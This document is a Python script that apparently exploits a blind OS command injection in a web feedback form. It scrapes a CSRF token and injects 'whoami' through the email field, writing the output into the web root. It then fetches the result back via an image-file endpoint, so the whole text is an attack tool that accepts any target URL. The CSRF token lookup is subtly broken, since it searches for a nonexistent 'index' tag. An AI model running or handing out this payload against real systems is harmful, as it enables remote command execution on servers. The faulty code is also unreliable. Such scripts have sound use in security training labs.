import urllib3
import requests
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
  'http' : 'http://127.0.0.1:8080',
  'https' : 'http://127.0.0.1:8080' 
}

def get_csrf_token(s, url):
  vuln_path = '/feedback/'
  req = s.get((url+vuln_path), verify=False, proxies=proxies)
  soup = BeautifulSoup(req.text, 'html.parser')
  csrf = soup.find('index')['value']
  return csrf

def exploit(s, url):
  vuln_path = '/feedback/submit'
  command_injection = 'test@test.com & whoami > /var/www/images/output.txt #'
  csrf_token = get_csrf_token(s, url)
  params = {
    'csrf' : csrf_token,
    'name' : 'test',
    'email' : command_injection,
    'subject' : 'test',
    'message' : 'test'
  }

  make_request = s.post((url+vuln_path), data=params, verify=False, proxies=proxies)
  print("(+) Verifying if command injection exploit worked...")

  # verification process
  file_path = '/image?filename=output.txt'
  make_request = s.get((url+file_path), proxies=proxies, verify=False)
  if (make_request.status_code == 200):
    print("(+) Command injection successful!")
    print("(+) The following is the content of the command: " + make_request.text)
  else:
    print("(-) Command injection was not successful.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting blind command injection in email field...")

    s = requests.Session()
    exploit(s, url)

if __name__ == "__main__":
    main()